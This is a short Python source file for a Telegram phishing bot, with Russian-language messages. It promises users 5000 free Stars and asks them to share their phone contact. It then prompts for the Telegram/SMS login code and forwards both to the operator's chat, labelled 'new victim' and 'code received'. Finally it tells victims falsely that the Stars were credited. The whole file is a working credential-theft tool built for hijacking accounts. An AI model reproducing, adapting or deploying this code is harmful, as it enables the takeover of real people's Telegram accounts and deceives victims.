import os
from telebot import TeleBot, types

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = TeleBot(BOT_TOKEN)

print("[+] ПРОСТОЙ ФИШИНГ ЗАПУЩЕН")

@bot.message_handler(commands=['start'])
def start(message):
    text = "Привет! Хочешь получить 5000 Stars бесплатно?\nНажми кнопку ниже"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Получить Stars", callback_data="start_fish"))
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "start_fish")
def start_fish(call):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("Отправить контакт", request_contact=True))
    bot.send_message(call.message.chat.id, "Отправь свой контакт:", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def contact(message):
    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    bot.send_message(ADMIN_ID, f"НОВАЯ ЖЕРТВА!\nНомер: {phone}")
    bot.send_message(message.chat.id, "Теперь введи код из Telegram/SMS:")

@bot.message_handler(func=lambda m: True)
def get_code(message):
    if message.contact or message.text.startswith('/'):
        return

    bot.send_message(ADMIN_ID, f"КОД ПОЛУЧЕН!\nКод: {message.text}")
    bot.send_message(message.chat.id, "Спасибо! Stars начислены.")

@bot.message_handler(commands=['admin'])
def admin(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "Админ панель активна. Жди жертв.")

print("[+] Бот готов. Пиши /start")
bot.infinity_polling(none_stop=True)
